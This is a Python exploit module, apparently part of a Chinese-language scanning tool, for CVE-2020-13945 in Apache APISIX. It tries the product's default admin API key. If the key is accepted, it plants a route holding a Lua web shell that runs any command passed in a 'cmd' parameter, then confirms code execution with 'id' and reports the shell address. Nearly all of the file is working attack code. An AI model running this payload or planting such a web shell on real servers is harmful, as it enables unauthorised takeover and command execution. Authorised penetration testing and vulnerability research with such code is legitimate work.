#!/user/bin/env python3
# -*- coding: utf-8 -*-
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import requests,urllib3
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class Cve_2020_13945:
    def send_payload(self,url):
        url2 = url + '/apisix/admin/routes'
        header = {
            "User-Agent": self.header,
            "X-API-KEY": "edd1c9f034335f136f87ad84b625c8f1",
        }
        try:
            req = requests.get(url2, verify=self.verify,proxies=self.proxy,headers=header)
            if req.status_code == 200 and "/apisix" in req.text:
                OutPrintInfoSuc("Apache", f"存在Apache APISIX 默认密钥漏洞{url}")
                if not self.batch:
                    OutPrintInfo("Apache", "X-API-KEY: edd1c9f034335f136f87ad84b625c8f1")
                else:
                    OutPutFile("apache_2020_13945.txt",f"存在Apache APISIX 默认密钥漏洞{url}")
                return True
            else:
                if not self.batch:
                    OutPrintInfo("Apache", f"不存在Apache APISIX 默认密钥漏洞")
                return False
        except Exception:
            if not self.batch:
                OutPrintInfo("Apache", "目标请求出错")
            return False
    def send_payload2(self,url):
        url2 = url + '/apisix/admin/routes'
        header = {
            "Accept-Encoding": "gzip, deflate",
            "Accept": "*/*",
            "Accept-Language": "en",
            "User-Agent": self.header,
            "Connection": "close",
            "X-API-KEY": "edd1c9f034335f136f87ad84b625c8f1",
            "Content-Type": "application/json"
        }
        data = {
            "uri": "/vulscsz",
            "script": "local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close() \n end \nreturn _M",
            "upstream": {
            "type": "roundrobin",
            "nodes": {
            "example.com:80": 1
            }
            }
            }
        url3 = url + "/vulscsz?cmd=id"
        try:
            req = requests.post(url2, verify=self.verify,proxies=self.proxy,headers=header,json=data)
            req2 = requests.get(url3, verify=self.verify,proxies=self.proxy,headers={"User-Agent":self.header})
            if "uid=" in req2.text and req2.status_code == 200:
                OutPrintInfoSuc("Apache", f"Shell地址: {url3}")
                if not self.batch:
                    OutPrintInfo("Apache", f"Response: \n{req2.text.strip()}")
                else:
                    OutPutFile("apache_2020_13945.txt", f"Shell地址: {url3}")

            else:
                if not self.batch:
                    OutPrintInfo("Apache", f"不存在Apache APISIX 默认密钥漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("Apache", "目标请求出错")
            return
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        self.header = target["header"]
        proxy = target["proxy"]
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Apache", "开始检测Apache APISIX 默认密钥漏洞...")

        if self.send_payload(url):
            if not self.batch:
                OutPrintInfo("Apache", "尝试获取Shell...")

            self.send_payload2(url)
        if not self.batch:
            OutPrintInfo("Apache", "Apache APISIX 默认密钥漏洞检测结束")